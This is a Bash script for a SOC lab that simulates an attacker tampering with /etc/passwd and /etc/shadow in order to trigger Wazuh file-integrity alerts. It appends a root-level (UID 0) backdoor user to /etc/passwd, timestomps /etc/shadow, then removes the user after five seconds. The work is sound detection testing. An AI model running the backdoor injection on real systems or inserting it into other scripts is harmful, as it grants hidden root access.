#!/bin/bash
# ==============================================================================
# Script: attack-fim-tamper.sh
# Description: Simulates unauthorized file tampering and backdoor creation
# Language: Pure Bash (Zero Python)
# Triggers: Wazuh FIM Rules 550, 554, and Custom Rule 100001 (MITRE T1078, T1098)
# ==============================================================================

set -e

if [ "$EUID" -ne 0 ]; then
  echo "[-] Please run as root (use sudo) to simulate privilege file tampering."
  exit 1
fi

echo "[*] ==================================================="
echo "[*] SOC LAB ATTACK SIMULATION: File Integrity Tampering"
echo "[*] Target: /etc/passwd and /etc/shadow"
echo "[*] MITRE ATT&CK: T1098 (Account Manipulation), T1078 (Valid Accounts)"
echo "[*] ==================================================="

BACKUP_FILE="/etc/passwd.soclab.bak"
BACKDOOR_USER="attacker_backdoor"

echo "[*] Step 1: Creating safety backup of /etc/passwd to $BACKUP_FILE..."
cp /etc/passwd "$BACKUP_FILE"

echo "[*] Step 2: Injecting unauthorized backdoor user into /etc/passwd..."
echo "$BACKDOOR_USER:x:0:0:Adversary Backdoor:/root:/bin/bash" >> /etc/passwd

echo "[*] Step 3: Modifying timestamp of /etc/shadow (timestomping test)..."
touch /etc/shadow

echo "[*] Step 4: Forcing Wazuh Syscheck scan run..."
if [ -f /var/ossec/bin/agent-control ]; then
  /var/ossec/bin/agent-control -r -a || true
fi

echo ""
echo "[+] Malicious modifications injected!"
echo "[*] Waiting 5 seconds before reverting to keep system safe..."
sleep 5

echo "[*] Step 5: Restoring /etc/passwd from backup..."
sed -i "/$BACKDOOR_USER/d" /etc/passwd
rm -f "$BACKUP_FILE"

echo "[+] Cleanup complete. System restored to safe state."
echo "[+] Check Wazuh Dashboard under 'Integrity Monitoring':"
echo "    - Target file: /etc/passwd"
echo "    - Look for: 'File integrity monitoring: File modified' (Rule 550)"
echo "    - Look for Custom Rule 100001: 'Critical system authentication file modified'"
